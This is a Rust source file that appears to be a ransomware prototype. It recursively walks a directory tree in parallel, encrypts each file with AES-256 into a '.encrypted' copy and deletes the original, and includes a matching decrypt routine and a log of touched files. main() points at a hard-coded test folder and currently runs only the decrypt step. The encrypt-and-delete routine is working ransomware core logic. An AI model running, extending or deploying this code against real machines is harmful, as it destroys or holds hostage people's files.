#![allow(unused_mut)]
#![allow(dead_code)]
#![allow(unused_variables)]
use std::fs;
use std::io::Write;
use std::fs::File;
use std::path::PathBuf;
use std::fs::OpenOptions;
use rayon::prelude::*;
use aes256;


const MAX_DEPTH: u32 = 12;

#[derive(Debug)]
struct Node {
    path: PathBuf,
    depth: u32,
    files: Vec<String>,
    folders: Vec<Box<Node>>,
}

impl Node {
    pub fn new(path: PathBuf) -> Self {
        Node {
            path: path,
            depth: 0,
            files: Vec::new(),
            folders: Vec::new(),
        }
    }
    
    pub fn encrypt(&mut self, key: &str) {
        let mut data = ls_dir(&self.path);
        
        self.files = data.par_iter()
            .filter(|x| x.is_file())
            .map(|y| y.as_path().display().to_string())
            .collect();
       
        let _catch: Vec<u32> = data.par_iter()
            .filter(|x| x.is_file())
            .map(|y| {
                println!("ENCRYPTING: {}", &y.to_str().unwrap());
                let path: &str = y.to_str().unwrap();
                let epath: &str = &(path.to_owned()+".encrypted");
                aes256::encrypt(path, epath, key); 
                fs::remove_file(path).expect("Failed to delete file");
                0_u32
            }).collect();
            
        self.folders.par_extend(
            data.par_iter()
            .filter(|x| x.is_dir() && self.depth < MAX_DEPTH)
            .map(|y| {
                let mut new_node = Node::new((*y).to_path_buf());
                new_node.depth = self.depth+1;
                new_node.encrypt(key);
                Box::new(new_node)
            }));
    }

    pub fn decrypt(&mut self, key: &str) {
        let mut data = ls_dir(&self.path);
       
        // filter for is_file() and filename ends with '.encrypted'
        let _catch: Vec<u32> = data.par_iter()
            .filter(|x| { 
                x.is_file() 
                && &x.to_str().unwrap()[(&x.to_str().unwrap()).len()-10..] == ".encrypted"
            })
            .map(|y| {
                println!("DECRYPTING: {}", &y.to_str().unwrap());
                let epath: &str = y.to_str().unwrap();
                let dpath: &str = &epath[..epath.len()-10];
                aes256::decrypt(epath, dpath, key); 
                fs::remove_file(epath).expect("Failed to delete file");
                0_u32
            }).collect();
            
        self.folders.par_extend(
            data.par_iter()
            .filter(|x| x.is_dir() && self.depth < MAX_DEPTH)
            .map(|y| {
                let mut new_node = Node::new((*y).to_path_buf());
                new_node.depth = self.depth+1;
                new_node.decrypt(key);
                Box::new(new_node)
            }));
    }
}

fn write_file_list(file_list: Vec<&String>, path: &str) {
    let mut new_file = OpenOptions::new()
        .write(true)
        .append(true)
        .open(path)
        .unwrap();
        
    for file in &file_list {
        if let Err(e) = writeln!(new_file, "{}", file) {
            eprintln!("Could not write to file: {}", e);
        }
    }
} 

fn get_file_list<'a>(node: &'a Node, file_list: &mut Vec<&'a String>) {
    file_list.extend(&node.files);
    file_list.to_vec();

    for n in &node.folders {
        get_file_list(&n, file_list);
    }
}

fn ls_dir(path: &PathBuf) -> Vec<PathBuf> {
    let mut contents: Vec<PathBuf> = Vec::new();
    let current_dir: fs::ReadDir = fs::read_dir(path).unwrap();

    for file in current_dir {
        contents.push(file.unwrap().path());
    }
    contents
}

fn make_file_list(enode: &Node) {
    let mut file_list: Vec<&String> = Vec::new();
    get_file_list(enode, &mut file_list); 
    
    let list_path: &str = "./files_touched.txt";
    let mut to_file: File = match File::create(list_path) {
        Ok(_file) => _file,
        Err(_e) => panic!("Error creating file {}", list_path),
    };
    
    write_file_list(file_list, list_path);
}

fn main() {
    let key_path: &str = "./key.txt";
    //aes256::gen_key(key_path);

    let root_path: PathBuf = PathBuf::from("/home/arbegla/test");
    //let mut enode: Node = Node::new(root_path.clone());
    let mut dnode: Node = Node::new(root_path.clone());

    //enode.encrypt(key_path);
    dnode.decrypt(key_path);
}
